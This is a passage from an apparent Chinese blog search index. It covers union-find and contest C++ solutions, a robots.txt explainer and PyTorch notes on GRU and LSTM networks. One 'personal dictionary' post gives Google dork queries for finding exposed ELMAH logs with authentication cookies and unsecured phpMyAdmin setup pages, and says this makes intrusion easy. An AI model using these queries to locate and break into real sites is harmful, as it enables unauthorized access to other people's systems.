//记录是否作为某个集合的根结点int course[N] = &#123;0&#125;;int findFather(int x)   //查找x所在结点的根结点&#123;    int a = x;    while(x != father[x])    &#123;        x = father[x];    &#125;    //路径压缩    while(a != father[a])    &#123;        int z = a;        a = father[a];        father[z] = x;    &#125;    return x;&#125;void Union(int a,int b)&#123;    int faA = findFather(a);    int faB = findFather(b);    if(faA != faB)  //相同可能是这个人单独喜欢了一个活动，但不要再改father了，防止这个结点在别的活动里已经加入一个集合了    &#123;        father[faA] = faB;    &#125;&#125;void init(int n)    //初始化father[i]为i,flag[i] = false&#123;    for(int i = 1;i &lt;= n;i++)    &#123;        father[i] = i;        isRoot[i] = false;    &#125;&#125;bool cmp(int a, int b)  //将isRoot数组从大到小排序&#123;    return a &gt; b;&#125;int main()&#123;    int n,k,h;    scanf(\"%d\", &amp;n);    //人数    init(n);    //初始化    for(int i = 1;i &lt;= n;i++)    &#123;        scanf(\"%d:\",&amp;k);    //活动个数        for(int j = 0;j &lt; k;j++)        &#123;            scanf(\"%d\",&amp;h); //i号人喜欢的活动h            if(course[h] == 0)  //活动h第一次有人喜欢                course[h] = i;            Union(i, findFather(course[h]));    //合并        &#125;    &#125;    for(int i = 1;i &lt;= n;i++)    &#123;        isRoot[findFather(i)]++;    //i的根结点是findFather[i]，人数加1    &#125;    int ans = 0;    //记录集合数目    for(int i = 1;i &lt;= n;i++)    &#123;        if(isRoot[i] != 0)  //是根结点            ans++;    &#125;    printf(\"%d\\n\",ans);    sort(isRoot+1, isRoot+n+1, cmp);    for(int i = 1;i &lt;= ans;i++)    &#123;        printf(\"%d\",isRoot[i]);        if(i &lt; ans) printf(\" \");    &#125;    return 0;&#125;\n\n","thumbnail":"https://i.loli.net/2020/09/04/yCzXAYSRxPMwGqB.jpg","plink":"https://yuyuoo.github.io/2020/09/04/算法笔记之《算法笔记》/"},{"title":"蓝桥杯校内模拟赛","date":"2020-03-19T01:24:14.000Z","date_formatted":{"ll":"Mar 19, 2020","L":"03/19/2020","MM-DD":"03-19"},"updated":"2020-03-19T04:34:05.105Z","content":"上周参加的蓝桥杯校内模拟赛，感觉并不难。前四题是填空题，只需要给出计算结果，并不都需要写程序计算。5-10题是编程题，大概是CSP第一、二题的难度。\n比赛没有给出成绩结果，只有校内排名，所以这篇总结只能写出我自己的思考过程，并不知道对不对、超不超时​ ​。\n第五题：\n解题思路：\n用一个flag标记现在所处的是元音状态还是辅音状态。flag=1是元音状态，=0是辅音状态。以一个count记录元辅音翻转了几次。若第一个字母是辅音且一共翻转了4次，那么符合要求。\n参考代码：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;#define MAXN 105int main()&#123;    char word[MAXN];    //memset(word,'/0',sizeof(word));    cin &gt;&gt; word;    int count = 0;    int i = 0;    int flag = 1;   //flag=1是元音状态，=0是辅音状态    if(word[0] == 'a'||word[0] == 'e'||word[0] == 'i'||word[0] == 'o'||word[0] == 'u')  //以元音开头直接结束    &#123;        cout &lt;&lt; \"no\";        return 0;    &#125;    //以辅音开头    while(word[i] != '\\0')    &#123;        if(word[i] == 'a'||word[i] == 'e'||word[i] == 'i'||word[i] == 'o'||word[i] == 'u')//这一节是元音        &#123;            if(flag == 1)   //上一个字母也是元音            &#123;                i++;            &#125;            else            &#123;                i++;                count++;                flag = 1;            &#125;        &#125;        else    //是辅音字母        &#123;            if(flag ==0)            &#123;                i++;            &#125;            else            &#123;                i++;                count++;                flag = 0;            &#125;        &#125;    &#125;    if(count == 4)        cout &lt;&lt; \"yes\";    else    &#123;        cout &lt;&lt; \"no\";    &#125;    return 0;&#125;\n\n第六题：\n解题思路：\n\n这题只要不断地进行除法、取余操作，不断地判断个位和十位数的大小直到只剩1位即可。\n\n参考代码：\n123456789101112131415161718192021222324252627282930313233#include&lt;iostream&gt;using namespace std;#define MAXN 1000005int inc(int n)&#123;    while(n &gt;= 10)    &#123;        int a = n % 10; //个位数        int b = (n / 10) % 10;  //十位数        if (a &gt;= b)        &#123;            n = n / 10;            continue;        &#125;        else return 0;    &#125;    return 1;&#125;int main()&#123;    int n;    cin &gt;&gt; n;    int ans = 0;    for(int i = 1;i &lt;= n;i++)    &#123;        if(inc(i) == 1) //是递增            ans++;    &#125;    cout &lt;&lt; ans;    return 0;&#125;\n\n第七题：\n解题思路：\n\n这题的意思就是，对于每个不在头尾的数，左边都有比它小的，右边都有比它大的。那么对于这些数，用一个struct来同时记录它的数值和位置。但是后来一想，下标就是位置了……那么第一层循环遍历每个数，第二层循环遍历这个数左边的，看是否有比它小的，有的话就再看右边是否有比它大的。\n\n参考代码：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;iostream&gt;using namespace std;#define MAXN 10005struct A&#123;    int num;    int pos;&#125;;int main()&#123;    int n;    cin &gt;&gt; n;    A a[MAXN];    int ans = 0;    int flag = 0;    A temp;    int k;    for(int i = 0;i &lt; n;i++)    &#123;        cin &gt;&gt; a[i].num;        a[i].pos = i;    &#125;    for(int i = 0;i &lt; n;i++)    &#123;        for(int j = 0;j &lt; i;j++)        &#123;            if(a[j].num &lt; a[i].num) //前半部分有            &#123;                for(k = i+1;k &lt; n;k++)                &#123;                    if(a[k].num &gt; a[i].num)                    &#123;                        ans++;                        break;                    &#125;                &#125;            &#125;            if(a[j].num &lt; a[i].num)  //前半部分有                break;        &#125;            &#125;        cout &lt;&lt; ans;    return 0;&#125;\n\n第八题：\n\n解题思路：\n\n第八题我用的是深度优先遍历，很大可能是会超时，因为当输入30时就需要好久才能出结果。听别的同学说可能要用动态规划……忘了动态规划怎么用了……​​回头再看吧。\n\n参考代码：\n1234567891011121314151617181920212223242526272829303132333435#include&lt;iostream&gt;using namespace std;long long ans;void dfs(int i,int n)   //i是第2个数，n是第一个数&#123;    int diff = abs(n-i);    if(diff &gt; 1)    &#123;        int j = diff-1;        while(j &gt; 0)        &#123;            ans++;            dfs(j,i);            j--;        &#125;    &#125;&#125;int  main()&#123;    int n;    cin &gt;&gt; n;    int i = n;    while(i &gt; 0)    &#123;        ans++;        dfs(i,n);        i--;    &#125;    ans = ans % 10000;    cout &lt;&lt; ans;    return 0;&#125;\n\n第九题：\n\n解题思路：\n\n长草是一批一批的，刚种的菜是不能影响周边区域的，所以要标记每一次长出的草是属于哪一批，只要不是新长的草，都能影响周边区域。对于每一批统计，都遍历二维数组，看是否新长。\n\n参考代码：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;iostream&gt;using namespace std;int main()&#123;    int n,m;    cin &gt;&gt; n &gt;&gt; m;    char c;    int land[n][m];    int k;    //初始化全0    for(int i = 0;i &lt; n;i++)    &#123;        for(int j = 0;j &lt; m;j++)        &#123;            land[i][j] = 0;        &#125;    &#125;    for(int i = 0;i &lt; n;i++)    &#123;        for(int j = 0;j &lt; m;j++)        &#123;            cin &gt;&gt; c;            if(c == 'g')                land[i][j] = 1;            else if(c == '\\n')            \tcontinue;        &#125;    &#125;        cin &gt;&gt; k;    for(int x = 0;x &lt; k;x++)    &#123;        for(int i = 0;i &lt; n;i++)        &#123;            for(int j = 0;j &lt; m;j++)            &#123;                if(land[i][j] == 0 &amp;&amp; j &gt; 0 &amp;&amp; land[i][j-1] &gt; land[i][j] &amp;&amp; land[i][j-1] != x+2)    //左边有草且不是新栽的                &#123;                    land[i][j] = x+2;                &#125;                else if(land[i][j] == 0&amp;&amp;j &lt; m-1 &amp;&amp; land[i][j+1] &gt; land[i][j] &amp;&amp; land[i][j+1] != x+2) //右边                &#123;                    land[i][j] = x+2;                &#125;                else if(land[i][j] == 0&amp;&amp;i &gt; 0 &amp;&amp; land[i-1][j] &gt; land[i][j] &amp;&amp; land[i-1][j] != x+2) //上边                &#123;                    land[i][j] = x+2;                &#125;                else if(land[i][j] == 0&amp;&amp;i &lt; n-1 &amp;&amp; land[i+1][j] &gt; land[i][j] &amp;&amp; land[i+1][j] != x+2) //下边                &#123;                    land[i][j] = x+2;                &#125;            &#125;        &#125;    &#125;    for(int i = 0;i &lt; n;i++)    &#123;        for(int j = 0;j &lt; m;j++)        &#123;            if(land[i][j] != 0)            &#123;                cout &lt;&lt; 'g';            &#125;                            else cout &lt;&lt; '.';        &#125;        cout &lt;&lt; '\\n';    &#125;    return 0;&#125;\n\n第十题：\n\n解题思路：\n\n比如有5个节目，要选3个，那么第1个节目就是在第一个到第三个节目里选最大的，然后第2个节目就是在1的右边至第四个中间选最大的，第3个节目就是右边剩下的所有节目选最大的。因为要保证第1个节目的值尽量大，同时要给后面两个节目留后路，就算第1个节目不幸选中了三号，那么剩下两个节目还可以是第四个和第五个；就算第2个节目不幸选中了四号，第3个节目还能选第五个。\n\n参考代码：\n1234567891011121314151617181920212223242526272829303132333435363738#include&lt;iostream&gt;using namespace std;#define MAXN 100005int main()&#123;    int n,m;    cin &gt;&gt; n &gt;&gt; m;    int like[MAXN];    int tmpnum,tmppos;    int ans[m]; //选中的表演的喜爱值    int chpos = 0;  //上一个被选中的表演的序号,从1开始    for(int i = 0;i &lt; n;i++)    &#123;        cin &gt;&gt; like[i];    &#125;    for(int j = 1;j &lt;= m;j++)    &#123;        int choice = n-(m-j);   //先对前choice个数字排序，选最大的        tmpnum = like[chpos];        tmppos = chpos;        for(int k = chpos;k &lt; choice;k++)        &#123;            if(tmpnum &lt; like[k])            &#123;                tmpnum = like[k];                tmppos = k;            &#125;        &#125;        ans[j-1] = tmpnum;        chpos = tmppos+1;    &#125;    for(int j = 0;j &lt; m;j++)    &#123;        cout &lt;&lt; ans[j] &lt;&lt; \" \";    &#125;    return 0;&#125;\n\n","thumbnail":"https://s1.ax1x.com/2020/03/19/8rFdVU.jpg","plink":"https://yuyuoo.github.io/2020/03/19/蓝桥杯校内模拟赛/"},{"title":"不定期更新的个人词典","date":"2020-03-07T02:08:11.000Z","date_formatted":{"ll":"Mar 7, 2020","L":"03/07/2020","MM-DD":"03-07"},"updated":"2020-05-26T13:43:40.748Z","content":"Google Dork参考文章：http://blog.sina.com.cn/s/blog_406a91a00102xbrb.html\nELMAH错误日志记录组件可以记录非常详细的错误信息供管理员和开发人员进行分析。如果没有把 ELMAH 日志的错误保护好，以至于所有人都能看到，那如果想入侵一个这样的站点的话，是非常简单的事情，只需要到 Google 上搜索一下这个关键字：inurl:elmah.axd ASPXAUTH 就行了。有上万条包括验证（authentication）信息的记录。在 Google 引擎里出现这种情况，其实行内人都称之为 Google Dork，这个词语的大概意思就是说这种信息虽然没有禁止 Google 收录，但是往往是安全或者致命的信息，比如 phpMyAdmin 初始化的时候，如果没有设置密码，或者管理员没有删除类似的初始化页面，默认页一般是初始化操作，比如 Welcome to phpMyAdmin, 然后让你创建一个数据库（Create new database），那你如果搜索 &quot;Welcome to phpMyAdmin&quot;AND&quot; Create new database&quot; 的话，Google 会给你一大批记录。\n可插拔的应用程序所谓可插拔性，字面理解就是插上去和不插上去都不影响系统正常运行，插上去某个功能就会实现，拔掉，又不会影响系统运行。体现在软件上就可以理解为加个配置自动运行，不加配置就自动停止。\n比如微软的 Windows 操作系统。你可以在 Windows 操作系统上安装 QQ，也可卸掉 QQ，这便是可插拔。相对 Windows 操作系统，QQ 就是它的一个插件。所以可以简单的将开发可插拔的软件分为两个部分。一个是主应用程序的开发，一个是插件的开发。\nRobots协议Robots 协议（也称为爬虫协议、机器人协议等）的全称是 “网络爬虫排除标准”（Robots Exclusion Protocol），网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。\n在网站根目录下放一个 robots.txt 文本文件（如 https://www.taobao.com/robots.txt ），里面可以指定不同的网络爬虫能访问的页面和禁止访问的页面，指定的页面由正则表达式表示。网络爬虫在采集这个网站之前，首先获取到这个 robots.txt 文本文件，然后解析到其中的规则，然后根据规则来采集网站的数据。\n举例：\n1234567891011121314151617181920212223242526禁止所有机器人访问    User-agent: *    Disallow: &#x2F;允许所有机器人访问    User-agent: *    Disallow: 禁止特定机器人访问    User-agent: BadBot    Disallow: &#x2F;允许特定机器人访问    User-agent: GoodBot    Disallow: 禁止访问特定目录    User-agent: *    Disallow: &#x2F;images&#x2F;仅允许访问特定目录    User-agent: *    Allow: &#x2F;images&#x2F;    Disallow: &#x2F;禁止访问特定文件    User-agent: *    Disallow: &#x2F;*.html$仅允许访问特定文件    User-agent: *    Allow: &#x2F;*.html$    Disallow: &#x2F;\n\n","thumbnail":"https://s2.ax1x.com/2020/03/07/3OhTx0.png","plink":"https://yuyuoo.github.io/2020/03/07/不定期更新的个人词典/"},{"title":"pytorch笔记七：循环神经网络进阶","date":"2020-02-23T04:09:58.000Z","date_formatted":{"ll":"Feb 23, 2020","L":"02/23/2020","MM-DD":"02-23"},"updated":"2021-08-10T02:04:09.474Z","content":"GRURNN存在的问题：梯度较容易出现衰减或爆炸（BPTT）\n门控循环神经网络：捕捉时间序列中时间步距离较大的依赖关系\nRNN:\n$$\nH_{t} = ϕ(X_{t}W_{xh} + H_{t-1}W_{hh} + b_{h})\n$$\nGRU:\n$$\n\\begin{align}\nR_{t} = σ(X_tW_{xr} + H_{t−1}W_{hr} + b_r) \\\nZ_{t} = σ(X_tW_{xz} + H_{t−1}W_{hz} + b_z) \\\n\\widetilde{H}t = tanh(X_tW{xh} + (R_t ⊙H_{t−1})W_{hh} + b_h) \\\nH_t = Z_t⊙H_{t−1} + (1−Z_t)⊙\\widetilde{H}_t\n\\end{align}\n$$\n重置门有助于捕捉时间序列里短期的依赖关系。控制是否需要Ht-1，与Xt组合构成候选隐藏状态。重置门为0时，候选隐藏状态只包含Xt。更新门有助于捕捉时间序列里长期的依赖关系。Zt为1时，Ht = Ht-1。载入数据集12import osos.listdir('/home/kesci/input')\n\n1234import numpy as npimport torchfrom torch import nn, optimimport torch.nn.functional as F\n\n123456import syssys.path.append(\"../input/\")import d2l_jay9460 as d2ldevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')(corpus_indices, char_to_idx, idx_to_char, vocab_size) = d2l.load_data_jay_lyrics()\n\n初始化参数1234567891011121314151617181920212223num_inputs, num_hiddens, num_outputs = vocab_size, 256, vocab_sizeprint('will use', device)def get_params():      def _one(shape):        ts = torch.tensor(np.random.normal(0, 0.01, size=shape), device=device, dtype=torch.float32) #正态分布        return torch.nn.Parameter(ts, requires_grad=True)    def _three():        return (_one((num_inputs, num_hiddens)),                _one((num_hiddens, num_hiddens)),                torch.nn.Parameter(torch.zeros(num_hiddens, device=device, dtype=torch.float32), requires_grad=True))         W_xz, W_hz, b_z = _three()  # 更新门参数    W_xr, W_hr, b_r = _three()  # 重置门参数    W_xh, W_hh, b_h = _three()  # 候选隐藏状态参数        # 输出层参数    W_hq = _one((num_hiddens, num_outputs))    b_q = torch.nn.Parameter(torch.zeros(num_outputs, device=device, dtype=torch.float32), requires_grad=True)    return nn.ParameterList([W_xz, W_hz, b_z, W_xr, W_hr, b_r, W_xh, W_hh, b_h, W_hq, b_q])def init_gru_state(batch_size, num_hiddens, device):   #隐藏状态初始化    return (torch.zeros((batch_size, num_hiddens), device=device), )\n\n1will use cpu\n\n9+2个参数需要初始化。_one()函数用torch.tensor(np.random.normal(0, 0.01, size=shape)随机正态分布初始化，期望是0，方差是0.01。GRU模型123456789101112def gru(inputs, state, params):    W_xz, W_hz, b_z, W_xr, W_hr, b_r, W_xh, W_hh, b_h, W_hq, b_q = params    H, = state    outputs = []    for X in inputs:        Z = torch.sigmoid(torch.matmul(X, W_xz) + torch.matmul(H, W_hz) + b_z)        R = torch.sigmoid(torch.matmul(X, W_xr) + torch.matmul(H, W_hr) + b_r)        H_tilda = torch.tanh(torch.matmul(X, W_xh) + R * torch.matmul(H, W_hh) + b_h)        H = Z * H + (1 - Z) * H_tilda        Y = torch.matmul(H, W_hq) + b_q        outputs.append(Y)    return outputs, (H,)\n\n模型的代码就是翻译上面的四行公式。训练模型12num_epochs, num_steps, batch_size, lr, clipping_theta = 160, 35, 32, 1e2, 1e-2pred_period, pred_len, prefixes = 40, 50, ['分开', '不分开']\n\n12345d2l.train_and_predict_rnn(gru, get_params, init_gru_state, num_hiddens,                          vocab_size, device, corpus_indices, idx_to_char,                          char_to_idx, False, num_epochs, num_steps, lr,                          clipping_theta, batch_size, pred_period, pred_len,                          prefixes)\n\n123456epoch 40, perplexity 149.271885, time 1.17 sec - 分开 我想我不不 我想你的让我 你想我的让我 你想我不想 我想你我想想想想想你想你的可爱人  坏我的让我 - 不分开 我想你我不想 你不我 我想你的爱爱 我想你的让我 我想你我想想想想想想你的可爱人  坏我的让我 我epoch 160, perplexity 1.427383, time 1.16 sec - 分开 我已带口 你已已是不起 让你知没面对我 甩散球我满腔的怒火 我想揍你已经很久 别想躲 说你眼睛看着 - 不分开 整过 是你开的玩笑 想通 却又再考倒我 说散 你想很久了吧? 败给你的黑色幽默 说散 你想很久了吧\n\n简洁实现1234567891011num_hiddens=256num_epochs, num_steps, batch_size, lr, clipping_theta = 160, 35, 32, 1e2, 1e-2pred_period, pred_len, prefixes = 40, 50, ['分开', '不分开']lr = 1e-2 # 注意调整学习率gru_layer = nn.GRU(input_size=vocab_size, hidden_size=num_hiddens)model = d2l.RNNModel(gru_layer, vocab_size).to(device)d2l.train_and_predict_rnn_pytorch(model, num_hiddens, vocab_size, device,                                corpus_indices, idx_to_char, char_to_idx,                                num_epochs, num_steps, lr, clipping_theta,                                batch_size, pred_period, pred_len, prefixes)\n不用自己初始化参数和写模型代码。只需调用nn.GRU()生成gru_layer。123456789101112epoch 40, perplexity 1.016101, time 0.89 sec - 分开始想像 爸和妈当年的模样 说著一口吴侬软语的姑娘缓缓走过外滩 消失的 旧时光 一九四三 回头看 的片 - 不分开暴风圈来不及逃 我不能再想 我不能再想 我不 我不 我不能 爱情走的太快就像龙卷风 不能承受我已无处epoch 80, perplexity 1.010881, time 0.96 sec - 分开都会值得去做 我想大声宣布 对你依依不舍 连隔壁邻居都猜到我现在的感受 河边的风 在吹着头发飘动 牵 - 不分开暴风圈来不及逃 我不能再想 我不能再想 我不 我不 我不能 爱情走的太快就像龙卷风 不能承受我已无处epoch 120, perplexity 1.011403, time 0.95 sec - 分开的我爱你看棒球 想这样没担忧 唱着歌 一直走 我想就这样牵着你的手不放开 爱可不可以简简单单没有伤害 - 不分开暴风圈来不及逃 我不能再想 我不能再想 我不 我不 我不能 爱情走的太快就像龙卷风 不能承受我已无处epoch 160, perplexity 1.058085, time 0.88 sec - 分开始打呼 管到当初爱你的时空 停格内容不忠 所有回忆对着我进攻   简单爱情来的太快就像龙卷风 离不开 - 不分开始打呼 管家是一只是我怕眼泪撑不住 不懂 你给我抬起头 有话去对医药箱说 别怪我 别怪我 说你怎么面\n\nLSTM长短期记忆long short-term memory :\n遗忘门:控制上一时间步的记忆细胞。如果遗忘门是0，就相当于忘记记忆细胞Ct-1，Ct-1就不会被加到Ct上。\n输入门:控制当前时间步的输入。控制候选记忆细胞有多少被加到Ct上。如果输入门是1，候选记忆细胞就全部输入到Ct中。\n输出门:控制从记忆细胞输入多少到隐藏状态。\n记忆细胞：⼀种特殊的隐藏状态的信息的流动。\n\n$$\n\\begin{align*}\nI_t = σ(X_tW_{xi} + H_{t−1}W_{hi} + b_i) \\\\\nF_t = σ(X_tW_{xf} + H_{t−1}W_{hf} + b_f)\\\\\nO_t = σ(X_tW_{xo} + H_{t−1}W_{ho} + b_o)\\\\\n\\widetilde{C}_t = tanh(X_tW_{xc} + H_{t−1}W_{hc} + b_c)\\\\\nC_t = F_t ⊙C_{t−1} + I_t ⊙\\widetilde{C}_t\\\\\nH_t = O_t⊙tanh(C_t)\n\\end{align*}\n$$\n\n遗忘门、输入门、输出门都是由输入和隐藏状态组成的。初始化参数12345678910111213141516171819202122232425num_inputs, num_hiddens, num_outputs = vocab_size, 256, vocab_sizeprint('will use', device)def get_params():    def _one(shape):        ts = torch.tensor(np.random.normal(0, 0.01, size=shape), device=device, dtype=torch.float32)        return torch.nn.Parameter(ts, requires_grad=True)    def _three():        return (_one((num_inputs, num_hiddens)),                _one((num_hiddens, num_hiddens)),                torch.nn.Parameter(torch.zeros(num_hiddens, device=device, dtype=torch.float32), requires_grad=True))        W_xi, W_hi, b_i = _three()  # 输入门参数    W_xf, W_hf, b_f = _three()  # 遗忘门参数    W_xo, W_ho, b_o = _three()  # 输出门参数    W_xc, W_hc, b_c = _three()  # 候选记忆细胞参数        # 输出层参数    W_hq = _one((num_hiddens, num_outputs))    b_q = torch.nn.Parameter(torch.zeros(num_outputs, device=device, dtype=torch.float32), requires_grad=True)    return nn.ParameterList([W_xi, W_hi, b_i, W_xf, W_hf, b_f, W_xo, W_ho, b_o, W_xc, W_hc, b_c, W_hq, b_q])def init_lstm_state(batch_size, num_hiddens, device):    return (torch.zeros((batch_size, num_hiddens), device=device),             torch.zeros((batch_size, num_hiddens), device=device))\n\n1will use cpu\n\n初始化12个参数。LSTM模型1234567891011121314def lstm(inputs, state, params):    [W_xi, W_hi, b_i, W_xf, W_hf, b_f, W_xo, W_ho, b_o, W_xc, W_hc, b_c, W_hq, b_q] = params    (H, C) = state    outputs = []    for X in inputs:        I = torch.sigmoid(torch.matmul(X, W_xi) + torch.matmul(H, W_hi) + b_i)        F = torch.sigmoid(torch.matmul(X, W_xf) + torch.matmul(H, W_hf) + b_f)        O = torch.sigmoid(torch.matmul(X, W_xo) + torch.matmul(H, W_ho) + b_o)        C_tilda = torch.tanh(torch.matmul(X, W_xc) + torch.matmul(H, W_hc) + b_c)        C = F * C + I * C_tilda        H = O * C.tanh()        Y = torch.matmul(H, W_hq) + b_q        outputs.append(Y)    return outputs, (H, C)\n\n训练模型12345678num_epochs, num_steps, batch_size, lr, clipping_theta = 160, 35, 32, 1e2, 1e-2pred_period, pred_len, prefixes = 40, 50, ['分开', '不分开']d2l.train_and_predict_rnn(lstm, get_params, init_lstm_state, num_hiddens,                          vocab_size, device, corpus_indices, idx_to_char,                          char_to_idx, False, num_epochs, num_steps, lr,                          clipping_theta, batch_size, pred_period, pred_len,                          prefixes)\n\n123456789101112epoch 40, perplexity 211.457328, time 1.51 sec - 分开 我不的我 我不的我 我不不 我不的我 我不不 我不的我 我不不 我不的我 我不不 我不的我 我不不 - 不分开 我不不 我不的我 我不不 我不的我 我不不 我不的我 我不不 我不的我 我不不 我不的我 我不不 epoch 80, perplexity 68.458662, time 1.50 sec - 分开 我想你这你 我不要这你 我不要这你 我不要这你 我不要这你 我不要这你 我不要这你 我不要这你 我 - 不分开 我想你你的你 我想要你 我不要 我不要 我不要 我不要 我不要 我不要 我不要 我不要 我不要 我epoch 120, perplexity 15.034657, time 1.49 sec - 分开 我想你你的你笑 不知不觉 你你了一我不我 别发抖 快给我抬起起着你 别发抖 快给我抬起头 有你去对 - 不分开 我想你你 我不要再想我 不知不觉 你你了离不我 不知不觉 你跟了离不我 不知不觉 我该了这节活 后epoch 160, perplexity 3.897414, time 1.49 sec - 分开 我想带你里嵩山 学少林跟了了刚 我想就你了嵩着 我想去这生嵩 不天到双截棍 哼哼哈兮 快使用双截棍 - 不分开 我 我你你的微笑 像通  又又我 我想就这样牵着你的手不放  穿过来回单单 我 想和你样堡堡 我想\n\n简洁实现1234567891011num_hiddens=256num_epochs, num_steps, batch_size, lr, clipping_theta = 160, 35, 32, 1e2, 1e-2pred_period, pred_len, prefixes = 40, 50, ['分开', '不分开']lr = 1e-2 # 注意调整学习率lstm_layer = nn.LSTM(input_size=vocab_size, hidden_size=num_hiddens)model = d2l.RNNModel(lstm_layer, vocab_size)d2l.train_and_predict_rnn_pytorch(model, num_hiddens, vocab_size, device,                                corpus_indices, idx_to_char, char_to_idx,                                num_epochs, num_steps, lr, clipping_theta,                                batch_size, pred_period, pred_len, prefixes)\n\n123456789101112epoch 40, perplexity 1.019881, time 1.04 sec - 分开始打呼 管家是一只会说法语举止优雅的猪 吸血前会念约翰福音做为弥补 拥有一双蓝色眼睛的凯萨琳公主 专 - 不分开的玩笑 想通 却又再考倒我 说散 你想很久了吧? 败给你的黑色幽默 不想太多 我想一定是我听错弄错搞epoch 80, perplexity 1.013078, time 1.01 sec - 分开的话像语言暴力 我已无能为力再提起 决定中断熟悉 然后在这里 不限日期 然后将过去 慢慢温习 让我爱 - 不分开的玩笑 想通 却又再考倒我 说散 你想很久了吧? 败给你的黑色幽默 说散 你想很久了吧? 我的认真败epoch 120, perplexity 1.010264, time 1.01 sec - 分开 我们儿子她人在江南等我 泪不休 语沉默 一壶好酒 再来一碗热粥 配上几斤的牛肉 我说店小二 三两银 - 不分开 我有你看棒球 想这样没担忧 唱着歌 一直走 我想就这样牵着你的手不放开 爱可不可以简简单单没有伤害epoch 160, perplexity 1.008950, time 1.02 sec - 分开 我才  原来我只想要你 陪我去吃汉堡  说穿了其实我的愿望就怎么小 就怎么每天祈祷我的心跳你知道  - 不分开 我才你看 我想要再这样打我妈妈 我说的话 你甘会听 不要再这样打我妈妈 难道你手不会痛吗 其实我回\n\n深度循环神经网络\n$$\n\\begin{align}\n\\boldsymbol{H}t^{(1)} = \\phi(\\boldsymbol{X}_t \\boldsymbol{W}{xh}^{(1)} + \\boldsymbol{H}{t-1}^{(1)} \\boldsymbol{W}{hh}^{(1)} + \\boldsymbol{b}h^{(1)})\\\n\\boldsymbol{H}_t^{(\\ell)} = \\phi(\\boldsymbol{H}_t^{(\\ell-1)} \\boldsymbol{W}{xh}^{(\\ell)} + \\boldsymbol{H}{t-1}^{(\\ell)} \\boldsymbol{W}{hh}^{(\\ell)} + \\boldsymbol{b}h^{(\\ell)})\\\n\\boldsymbol{O}_t = \\boldsymbol{H}_t^{(L)} \\boldsymbol{W}{hq} + \\boldsymbol{b}_q\n\\end{align}\n$$\nGRU只有这张图的前两列，隐藏层H2的输入是H1和X2，以此类推。\n123456789101112num_hiddens=256num_epochs, num_steps, batch_size, lr, clipping_theta = 160, 35, 32, 1e2, 1e-2pred_period, pred_len, prefixes = 40, 50, ['分开', '不分开']lr = 1e-2 # 注意调整学习率gru_layer = nn.LSTM(input_size=vocab_size, hidden_size=num_hiddens,num_layers=2)model = d2l.RNNModel(gru_layer, vocab_size).to(device)d2l.train_and_predict_rnn_pytorch(model, num_hiddens, vocab_size, device,                                corpus_indices, idx_to_char, char_to_idx,                                num_epochs, num_steps, lr, clipping_theta,                                batch_size, pred_period, pred_len, prefixes)\n\n123456789101112epoch 40, perplexity 12.840496, time 1.52 sec - 分开我 想你的话我在想再你的让我女疼 我想你 我有要有 想你你 想你的让我女沉 我想你你 想你的让我女沉 - 不分开的经爱女人 坏坏的让我疯狂的可爱女人 坏坏的让我疯狂的可爱女人 坏坏的让我疯狂的可爱女人 坏坏的让我epoch 80, perplexity 1.247634, time 1.52 sec - 分开有一条热昏头的响尾蛇 无力的躺在干枯的河 在等待雨季来临变沼泽 灰狼啃食著水鹿的骨头 秃鹰盘旋死盯着 - 不分开的会手 穿梭放受 一朵一朵因你而香 试图让夕阳飞翔 带领你我环绕大自然 迎著风 开始共渡每一天 手牵epoch 120, perplexity 1.021974, time 1.56 sec - 分开我妈妈 我有多重要 我后悔没让你知道 安静的听你撒娇 看你睡著一直到老 就是开不了口让她知道 就是那 - 不分开的会堡  想要将我不投 又不会掩护我 选你这种队友 瞎透了我 说你说 分数怎么停留 一直在停留 谁让epoch 160, perplexity 1.016324, time 1.59 sec - 分开在没有一个人身留  旧时光 一九四三 在回忆 的路上 时间变好慢 老街坊 小弄堂 是属于那年代白墙黑 - 不分开的我有 有样的要再这样打我妈妈 难道你手不会痛吗 不要再这样打我妈妈 难道你手不会痛吗 不要再这样打\n\n设置nn.LSTM()的参数num_layers=2，也就是两个隐藏层，不写默认隐藏层是一层。不是越深越好，越深模型越复杂，对数据集的要求越高，内容更抽象。123456gru_layer = nn.LSTM(input_size=vocab_size, hidden_size=num_hiddens,num_layers=6)model = d2l.RNNModel(gru_layer, vocab_size).to(device)d2l.train_and_predict_rnn_pytorch(model, num_hiddens, vocab_size, device,                                corpus_indices, idx_to_char, char_to_idx,                                num_epochs, num_steps, lr, clipping_theta,                                batch_size, pred_period, pred_len, prefixes)\n\n123456789101112epoch 40, perplexity 276.815235, time 8.50 sec - 分开                                                   - 不分开                                                  epoch 80, perplexity 276.278550, time 8.51 sec - 分开                                                   - 不分开                                                  epoch 120, perplexity 276.146710, time 8.53 sec - 分开                                                   - 不分开                                                  epoch 160, perplexity 275.739864, time 9.04 sec - 分开                                                   - 不分开\n\n双向循环神经网络\n$$\n\\begin{align}\n\\overrightarrow{\\boldsymbol{H}}t &amp;= \\phi(\\boldsymbol{X}_t \\boldsymbol{W}{xh}^{(f)} + \\overrightarrow{\\boldsymbol{H}}{t-1} \\boldsymbol{W}{hh}^{(f)} + \\boldsymbol{b}h^{(f)})\\\n\\overleftarrow{\\boldsymbol{H}}_t &amp;= \\phi(\\boldsymbol{X}_t \\boldsymbol{W}{xh}^{(b)} + \\overleftarrow{\\boldsymbol{H}}{t+1} \\boldsymbol{W}{hh}^{(b)} + \\boldsymbol{b}h^{(b)})\\\n\\boldsymbol{H}_t=(\\overrightarrow{\\boldsymbol{H}}{t}, \\overleftarrow{\\boldsymbol{H}}t)\\\n\\boldsymbol{O}_t = \\boldsymbol{H}_t \\boldsymbol{W}{hq} + \\boldsymbol{b}_q\n\\end{align}\n$$\n有从前X1往Xt的方向，也有Xt往X1的方向。好处：原来只考虑了每个字前面的字对它的影响，现在前后字的影响都考虑。在nn.GRU()中加入bidirectional=True参数，就是双向。这个参数默认是false。123456789101112epoch 40, perplexity 1.001741, time 0.91 sec - 分开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开始开 - 